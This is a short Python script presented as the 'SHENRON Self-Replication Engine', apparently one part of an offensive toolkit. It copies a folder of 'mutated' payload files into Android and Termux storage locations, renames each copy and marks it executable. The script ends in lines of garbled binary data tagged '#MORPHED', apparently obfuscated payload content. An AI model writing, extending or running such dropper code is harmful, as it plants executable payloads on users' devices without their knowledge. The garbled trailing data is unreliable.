from core.engine.payload_registry import register_payload

#!/usr/bin/env python3
# cognitive_replicator.py - SHENRON Self-Replication Engine

import os, shutil, socket, time
from pathlib import Path

REPLICATION_TARGETS = [
    "/storage/emulated/0/Download",
    "/data/data/com.termux/files/home/.replica",
    "/sdcard/Documents",
    "/data/data/com.termux/files/usr/tmp",
]

MUTATED_LAYERS_DIR = os.path.expanduser("~/SHENRON/core/payloads/mutated")

def get_hostname():
    try:
        return socket.gethostname()
    except:
        return "shenron_host"

def replicate_payloads():
    for target in REPLICATION_TARGETS:
        os.makedirs(target, exist_ok=True)
        print(f"[â€¢] Planting into: {target}")
        for fname in os.listdir(MUTATED_LAYERS_DIR):
            src = os.path.join(MUTATED_LAYERS_DIR, fname)
            unique_name = f"{get_hostname()}_{int(time.time())}_{fname}"
            dest = os.path.join(target, unique_name)
            shutil.copy2(src, dest)
            os.chmod(dest, 0o755)
            print(f"[âœ“] Dropped replica: {dest}")

if __name__ == "__main__":
    replicate_payloads()

\'4itÏ©ÎÒºËRh-ÍÎì íÚÎâ¹€oW2»1j«c.™ûh÷y#MORPHED

¾ÇãM´<n%Rà%° rë¸EI<0Ò“'5 £À{!Q¡¶#MORPHED

)\&\×Øï1~Hty­£®ÕœXË-ïþdû5„…7#MORPHED
